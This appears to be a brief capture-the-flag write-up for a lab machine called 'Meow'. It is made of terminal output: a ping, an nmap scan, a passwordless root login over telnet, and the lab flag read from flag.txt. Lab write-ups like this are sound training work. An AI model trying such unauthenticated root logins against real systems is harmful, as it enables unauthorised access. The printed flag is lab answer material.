# meow

```
┌──(kali㉿kali)-[~/Downloads]
└─$ ping 10.129.217.99

PING 10.129.217.99 (10.129.217.99) 56(84) bytes of data.
64 bytes from 10.129.217.99: icmp_seq=1 ttl=63 time=23.8 ms
64 bytes from 10.129.217.99: icmp_seq=2 ttl=63 time=30.6 ms
64 bytes from 10.129.217.99: icmp_seq=4 ttl=63 time=24.2 ms
64 bytes from 10.129.217.99: icmp_seq=5 ttl=63 time=22.7 ms
64 bytes from 10.129.217.99: icmp_seq=6 ttl=63 time=24.6 ms
^C
--- 10.129.217.99 ping statistics ---
6 packets transmitted, 5 received, 16.6667% packet loss, time 5033ms
rtt min/avg/max/mdev = 22.729/25.177/30.577/2.771 ms
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC 10.129.217.99
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 17:44 EDT
Nmap scan report for 10.129.217.99
Host is up (0.025s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 15.03 seconds
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ telnet -l root 10.129.217.99
Trying 10.129.217.99...
Connected to 10.129.217.99.
Escape character is '^]'.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 07 Sep 2024 09:46:26 PM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             135
  Users logged in:       0
  IPv4 address for eth0: 10.129.217.99
  IPv6 address for eth0: dead:beef::250:56ff:feb0:32a2

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# whoami
root
root@Meow:~# 
```

```
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
```


